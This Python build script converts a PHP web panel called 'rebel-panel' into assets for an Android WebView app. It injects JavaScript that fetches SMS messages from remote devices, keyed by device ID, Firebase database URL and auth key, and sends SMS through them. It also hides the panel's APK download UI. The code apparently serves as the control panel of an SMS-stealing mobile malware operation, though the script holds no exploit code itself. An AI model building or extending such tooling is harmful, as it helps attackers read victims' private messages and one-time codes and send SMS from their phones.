#!/usr/bin/env python3
"""Extract rebel-panel/mobile.php frontend into Android WebView assets."""

from __future__ import annotations

import os
import re
import shutil

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
MOBILE_PHP = os.path.join(ROOT, "rebel-panel", "mobile.php")
FIREBASE_DEFAULTS = os.path.join(ROOT, "rebel-panel", "firebase_defaults.js")
OUT_DIR = os.path.join(ROOT, "app", "src", "main", "assets", "panel")

AVATAR_URL = (
    "https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/"
    "main/IMG_20260609_231734_741.jpg"
)

NATIVE_BOOT = """
window.REBEL_NATIVE_APP = true;
function rebelApiPost(endpoint, body) {
  if (window.RebelAndroid && typeof RebelAndroid.apiPost === 'function') {
    try {
      return JSON.parse(RebelAndroid.apiPost(endpoint, JSON.stringify(body || {})));
    } catch (e) {
      return { ok: false, error: String(e) };
    }
  }
  return null;
}
function rebelHideApkDownloadUi() {
  if (!window.REBEL_NATIVE_APP) return;
  document.querySelectorAll('.apk-dl-card, .apk-dl-btn').forEach(function (el) {
    el.style.display = 'none';
  });
  document.querySelectorAll('a.menu-item[download]').forEach(function (el) {
    el.style.display = 'none';
  });
}
"""


def read_mobile_html() -> str:
    with open(MOBILE_PHP, encoding="utf-8") as handle:
        content = handle.read()
    start = content.find("<!DOCTYPE")
    if start < 0:
        raise SystemExit("Could not find HTML in mobile.php")
    html = content[start:]
    html = re.sub(
        r"<\?php echo htmlspecialchars\(\$REBEL_AVATAR_URL[^?]*\?>",
        AVATAR_URL,
        html,
    )
    html = re.sub(
        r"<\?php echo htmlspecialchars\(\$REBEL_APK_DOWNLOAD_URL[^?]*\?>",
        "#",
        html,
    )
    html = re.sub(
        r"<\?php echo htmlspecialchars\(\$REBEL_APK_VERSION[^?]*\?>",
        "3.0",
        html,
    )
    return html


def extract_css(html: str) -> tuple[str, str]:
    match = re.search(r"<style>(.*?)</style>", html, re.DOTALL)
    if not match:
        raise SystemExit("Could not find <style> block")
    css = match.group(1).strip()
    html = re.sub(
        r"<style>.*?</style>",
        '<link rel="stylesheet" href="panel.css"/>',
        html,
        count=1,
        flags=re.DOTALL,
    )
    return html, css


def extract_js(html: str) -> tuple[str, str]:
    scripts = list(re.finditer(r"<script(?![^>]*src=)([^>]*)>(.*?)</script>", html, re.DOTALL))
    if not scripts:
        raise SystemExit("Could not find inline <script> block")
    main = scripts[-1]
    js = main.group(2).strip()
    html = html[: main.start()] + '<script src="panel.js"></script>' + html[main.end() :]
    return html, js


def patch_js(js: str) -> str:
    js = NATIVE_BOOT + js

    js = js.replace(
        "function fetchSmsViaPhp(inst,d){",
        "function fetchSmsViaPhp(inst,d){\n"
        "  var nativeRes=rebelApiPost('rebel_fetch_sms',{"
        "device_id:d.rawId,database_url:inst.restUrl,auth_key:getFbAuthKey(inst),"
        "schema:inst.schema||'rabel',device_node:d.deviceNode||'user_list',composite_id:d.id});"
        "  if(nativeRes){"
        "    if(!nativeRes.ok||!Array.isArray(nativeRes.messages))return Promise.resolve([]);"
        "    return Promise.resolve(nativeRes.messages.map(normalizeSms).filter(Boolean));"
        "  }",
    )

    js = js.replace(
        "function sendSmsFetch(body){",
        "function sendSmsFetch(body){\n"
        "  var nativeRes=rebelApiPost('rebel_send_sms',body||{});"
        "  if(nativeRes){"
        "    return Promise.resolve({httpOk:!!nativeRes.ok,data:nativeRes});"
        "  }",
    )

    js = js.replace(
        "(function(){\n  try{\n    panelReady=true;",
        "(function(){\n  try{\n    rebelHideApkDownloadUi();\n    panelReady=true;",
    )

    return js


def patch_html(html: str) -> str:
    html = html.replace(
        '<script src="firebase_defaults.js"></script>',
        '<script src="firebase_defaults.js"></script>\n'
        '<script src="panel-boot.js"></script>',
    )
    return html


def main() -> None:
    html = read_mobile_html()
    html, css = extract_css(html)
    html, js = extract_js(html)
    js = patch_js(js)
    html = patch_html(html)

    if os.path.isdir(OUT_DIR):
        shutil.rmtree(OUT_DIR)
    os.makedirs(OUT_DIR, exist_ok=True)

    with open(os.path.join(OUT_DIR, "index.html"), "w", encoding="utf-8") as handle:
        handle.write(html)
    with open(os.path.join(OUT_DIR, "panel.css"), "w", encoding="utf-8") as handle:
        handle.write(css + "\n")
    with open(os.path.join(OUT_DIR, "panel.js"), "w", encoding="utf-8") as handle:
        handle.write(js + "\n")
    with open(os.path.join(OUT_DIR, "panel-boot.js"), "w", encoding="utf-8") as handle:
        handle.write(NATIVE_BOOT.strip() + "\n")
    shutil.copy2(FIREBASE_DEFAULTS, os.path.join(OUT_DIR, "firebase_defaults.js"))

    print(f"Built panel assets in {OUT_DIR}")


if __name__ == "__main__":
    main()
